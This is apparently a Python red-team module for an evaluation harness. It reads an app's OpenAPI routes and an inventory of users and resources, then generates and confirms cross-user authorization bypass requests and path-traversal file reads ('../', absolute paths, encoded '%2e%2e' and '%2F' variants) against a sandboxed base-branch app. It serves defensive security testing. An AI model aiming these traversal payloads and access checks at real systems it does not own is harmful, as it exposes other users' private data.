"""Equipo rojo: genera variantes de ataque por plantillas y las confirma contra la base.

Solo contra apps propias dentro del sandbox. No usa ningún modelo: parte de un
inventario del caso (usuarios, registros con dueño, archivos con dueño) y de las
rutas que la app publica en su OpenAPI, y arma candidatos:

- `authz`: un usuario pide el registro de otro, en cada ruta que recibe un id
  por la ruta o por un parámetro de consulta.
- `files`: un usuario pide el archivo de otro escribiendo la ruta de varias
  formas (subir con `..`, ruta absoluta, barra codificada, etc.).

Cada recurso del inventario declara sus marcas: textos que solo su dueño debería
ver. Un candidato solo se conserva si se confirma contra la app de la rama base:
el dueño recibe alguna marca en esa ruta y el otro usuario también. El ataque
guarda las marcas que aparecieron y el pedido del dueño como control. No fija el
status: los datos de otro usuario son una fuga con cualquier código de respuesta.

Cada ataque lleva su grupo (la ruta, o la forma de escribir la ruta del
archivo), que es la unidad que se reserva.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import re
import sys
import time
import urllib.parse
from dataclasses import dataclass
from pathlib import Path

from .holdout import Attack, Clients, Control, Predicate, Unverifiable, exchange, searchable

INVENTORY_KEYS = {"users", "records", "files", "files_root"}
NAME_RE = re.compile(r"^[a-z0-9][a-z0-9_-]{0,30}$")
MIN_MARKER = 4  # una marca más corta aparecería por casualidad

# Formas de pedir el archivo de otro usuario desde la carpeta propia.
# {rel}: ruta del archivo desde la raíz de adjuntos; {me}: carpeta de quien ataca; {root}: raíz absoluta.
FILE_TEMPLATES: tuple[tuple[str, str, bool], ...] = (
    # (grupo, plantilla, ya viene codificada)
    ("parent", "../{rel}", False),
    ("dot-parent", "./../{rel}", False),
    ("own-dir-parent", "../{me}/../{rel}", False),
    ("double-slash", "..//{rel}", False),
    ("absolute", "{root}/{rel}", False),
    ("encoded-slash", "..%2F{rel_encoded}", True),
    ("encoded-dots", "%2e%2e/{rel}", True),
)


@dataclass(frozen=True)
class Inventory:
    users: dict[str, dict[str, str]]  # nombre -> headers de autenticación
    records: tuple[dict, ...] = ()  # {"id", "owner", "markers"}
    files: tuple[dict, ...] = ()  # {"path", "owner", "markers"}
    files_root: str = ""

    @classmethod
    def from_dict(cls, d: dict) -> "Inventory":
        if not isinstance(d, dict) or set(d) - INVENTORY_KEYS:
            raise ValueError("inventario inválido")
        users = d.get("users")
        if not isinstance(users, dict) or len(users) < 2:
            raise ValueError("el inventario necesita al menos dos usuarios")
        for name, headers in users.items():
            if not NAME_RE.match(str(name)) or not isinstance(headers, dict) or not headers:
                raise ValueError(f"usuario inválido en el inventario: {name!r}")
            if not all(isinstance(k, str) and isinstance(v, str) for k, v in headers.items()):
                raise ValueError(f"headers inválidos para {name!r}")
        records, files = d.get("records", []), d.get("files", [])
        all_markers: list[str] = []
        for items, key in ((records, "id"), (files, "path")):
            if not isinstance(items, list):
                raise ValueError("records y files deben ser listas")
            for it in items:
                if not isinstance(it, dict) or set(it) != {key, "owner", "markers"}:
                    raise ValueError(f"entrada de inventario inválida: {it!r}")
                markers = it["markers"]
                if it["owner"] not in users or not isinstance(it[key], str) or not it[key]:
                    raise ValueError(f"entrada de inventario inválida: {it!r}")
                if not isinstance(markers, list) or not markers or not all(isinstance(m, str) and len(m) >= MIN_MARKER for m in markers):
                    raise ValueError(f"marcas inválidas (mínimo {MIN_MARKER} caracteres): {it!r}")
                all_markers += markers
        if len(all_markers) != len(set(all_markers)):
            raise ValueError("una misma marca no puede pertenecer a dos recursos")
        root = d.get("files_root", "")
        if not isinstance(root, str) or (root and not root.startswith("/")):
            raise ValueError("files_root debe ser una ruta absoluta")
        return cls(dict(users), tuple(records), tuple(files), root.rstrip("/"))


def slug(text: str) -> str:
    return re.sub(r"[^a-z0-9]+", "-", text.lower()).strip("-") or "x"


def make_id(*parts: str) -> str:
    """Id legible y único. Termina en un hash de las partes originales, porque el
    texto legible pierde información (`/a-b/{id}` y `/a/b/{id}` se leen igual)."""
    digest = hashlib.sha256("\x00".join(parts).encode()).hexdigest()[:8]
    return f"{slug('-'.join(parts))[:55].rstrip('-')}-{digest}"


def get_routes(openapi: dict) -> list[tuple[str, list[str], list[str]]]:
    """Rutas GET de la app: (plantilla, parámetros de ruta, parámetros de consulta)."""
    routes = []
    for template, item in sorted((openapi.get("paths") or {}).items()):
        op = item.get("get") if isinstance(item, dict) else None
        if not isinstance(op, dict):
            continue
        params = [p for p in op.get("parameters", []) if isinstance(p, dict)]
        routes.append((
            template,
            [p["name"] for p in params if p.get("in") == "path"],
            [p["name"] for p in params if p.get("in") == "query"],
        ))
    return routes


@dataclass(frozen=True)
class Candidate:
    id: str
    family: str
    group: str
    request: dict  # pedido de quien ataca
    owner_request: dict  # el pedido equivalente hecho por el dueño
    markers: tuple[str, ...]


def _fill(template: str, names: list[str], value: str) -> str:
    for n in names:
        template = template.replace("{" + n + "}", urllib.parse.quote(value, safe=""))
    return template


def candidates(inv: Inventory, routes: list[tuple[str, list[str], list[str]]]) -> list[Candidate]:
    out: list[Candidate] = []
    seen: set[str] = set()

    def add(family: str, group: str, id_parts: tuple[str, ...], path: str, owner_path: str, owner: str, attacker: str, markers: list[str]) -> None:
        cid = make_id(*id_parts)
        if cid in seen:
            raise ValueError(f"id de candidato repetido: {cid}")
        seen.add(cid)
        out.append(Candidate(
            cid, family, group,
            {"method": "GET", "path": path, "headers": inv.users[attacker]},
            {"method": "GET", "path": owner_path, "headers": inv.users[owner]},
            tuple(markers),
        ))

    for template, path_params, query_params in routes:
        route = template
        for rec in inv.records:
            for attacker in sorted(inv.users):
                if attacker == rec["owner"]:
                    continue
                if path_params:
                    path = _fill(template, path_params, rec["id"])
                    add("authz", make_id(route), ("authz", route, rec["id"], attacker), path, path, rec["owner"], attacker, rec["markers"])
                else:
                    for q in query_params:
                        path = f"{template}?{q}={urllib.parse.quote(rec['id'], safe='')}"
                        add("authz", make_id(route, q), ("authz", route, q, rec["id"], attacker), path, path, rec["owner"], attacker, rec["markers"])
        if path_params:
            continue
        for f in inv.files:
            rel = f["path"]
            own_name = urllib.parse.quote(rel.split("/", 1)[-1], safe="/.")
            for attacker in sorted(inv.users):
                if attacker == f["owner"]:
                    continue
                for q in query_params:
                    for group, pattern, encoded in FILE_TEMPLATES:
                        if "{root}" in pattern and not inv.files_root:
                            continue
                        value = pattern.format(rel=rel, me=attacker, root=inv.files_root, rel_encoded=rel.replace("/", "%2F"))
                        if not encoded:
                            value = urllib.parse.quote(value, safe="/.")
                        add("files", group, ("files", route, q, group, rel, attacker), f"{template}?{q}={value}",
                            f"{template}?{q}={own_name}", f["owner"], attacker, f["markers"])
    return out


def confirm(base_url: str, cands: list[Candidate], budget: float = 60.0) -> list[Attack]:
    """Conserva los candidatos que funcionan contra la app.

    El dueño debe recibir alguna marca del recurso en esa ruta; si no, la ruta no
    entrega ese recurso y no hay nada que proteger. Con las marcas que el dueño
    sí recibe se arma el predicado, y el candidato queda si el otro usuario
    también las recibe. Cada usuario pide con su propio cliente.
    """
    import httpx

    deadline = time.monotonic() + budget
    confirmed = []
    with Clients() as clients:
        for c in cands:
            if time.monotonic() > deadline:
                raise TimeoutError("presupuesto agotado confirmando candidatos")
            try:
                owner_hops, _ = exchange(clients.for_request(c.owner_request), base_url, c.owner_request, deadline)
                owner_text = "\n".join(searchable(body) for _, body in owner_hops)
                present = tuple(m for m in c.markers if m in owner_text)
                if not present:
                    continue
                leak = Predicate(body_contains_any=present)
                hops, _ = exchange(clients.for_request(c.request), base_url, c.request, deadline)
            except (httpx.TransportError, Unverifiable):
                # La app no respondió algo legible a este pedido: no hay fuga que confirmar.
                continue
            if any(leak.matches(status, searchable(body)) for status, body in hops):
                confirmed.append(Attack(c.id, c.family, c.request, leak, c.group, Control(c.owner_request, leak)))
    return sorted(confirmed, key=lambda a: a.id)


def generate(base_url: str, inv: Inventory, budget: float = 60.0) -> list[Attack]:
    deadline = time.monotonic() + budget
    with Clients() as clients:
        request = {"method": "GET", "path": "/openapi.json"}
        hops, _ = exchange(clients.for_request(request), base_url, request, deadline)
    status, body = hops[-1]
    if status != 200:
        raise RuntimeError(f"la app no publica /openapi.json (status {status})")
    return confirm(base_url, candidates(inv, get_routes(json.loads(body))), deadline - time.monotonic())


def main(argv: list[str] | None = None) -> int:
    """Corre dentro del contenedor de Contraprueba, contra la app de la rama base."""
    from .evaluator import wait_for

    p = argparse.ArgumentParser(prog="contraprueba-redteam")
    p.add_argument("--base-url", required=True)
    p.add_argument("--health", default="/health")
    p.add_argument("--inventory", required=True)
    p.add_argument("--budget", type=float, default=60.0)
    args = p.parse_args(argv)
    inv = Inventory.from_dict(json.loads(Path(args.inventory).read_text()))
    if not wait_for(args.base_url.rstrip("/") + args.health, time.monotonic() + min(30.0, args.budget)):
        print(json.dumps({"error": "la app no respondió"}))
        return 2
    attacks = generate(args.base_url, inv, args.budget)
    print(json.dumps({"attacks": [a.to_dict() for a in attacks]}, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    sys.exit(main())
